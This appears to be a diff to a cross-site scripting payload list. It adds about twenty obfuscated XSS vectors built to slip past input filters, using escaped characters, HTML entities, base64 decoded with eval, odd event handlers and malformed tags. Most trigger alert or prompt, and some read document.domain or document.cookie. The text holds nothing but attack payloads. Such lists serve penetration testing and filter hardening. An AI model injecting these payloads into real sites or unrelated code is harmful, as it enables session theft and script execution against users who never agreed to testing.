@@ -1,4 +1,46 @@
-<svg onload=prompt%26%230000000040document.domain)><svg onload=prompt%26%23x000000028;document.domain)>
+javascript:%ef%bb%bfalert(XSS)
+
+%3CsvG%2Fx%3D%22%3E%22%2FoNloaD%3Dconfirm%28%29%2F%2F
+
+<svG/x=">"/oNloaD=confirm()//
+
+<x/ onpointerRawupdatE=+\u0061\u006cert&DiacriticalGrave;1&DiacriticalGrave;>Tocuch me!
+
+<input accesskey=X onclick="self['wind'+'ow']['one'+'rror']=alert;throw 1337;">
+
+<lol/onauxclick=[0].some(alert)>rightclickhere
+
+\"<>onauxclick<>=(eval)(atob(`YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==`))>+<sss
+
+marquee loop=1 width=0 onfinish=pr\u006fmpt(document.cookie)>Y000</marquee>
+
+<svg onload='new Function`["__"].find(al\u0065rt)`'>
+
+<svg onload="[]['\146\151\154\164\145\162']['\143\157\156\163\164\162\165\143\164\157\162'] ('\141\154\145\162\164\50\61\51')()">
+
+<svg onload=&#97&#108&#101&#114&#116(1)>
+
+<svg onload='new Function`["__"].find(al\u0065rt)`'>
+
+<svg%09%0a%0b%0c%0d%a0%00%20onload=alert (1)>
+
+  Function("\x61\x6c\x65\x72\x74\x28\x31\x29")();
+
+<svg onload=alert("")>
+
+<svg onload=alert%26%230000000040"")>
+
+<svg onx=() onload=(confirm)(1)>
+
+<object/data=javascript:alert()>
+
+<a/href="javascript%0A%0D:alert()">
+
+-(a=alert,b="__",[b].find(a))-'
+
+<svg onload=prompt%26%230000000040document.domain)>
+
+<svg onload=prompt%26%23x000000028;document.domain)>
 
 <svg onload=alert%26%230000000040"1")>
 
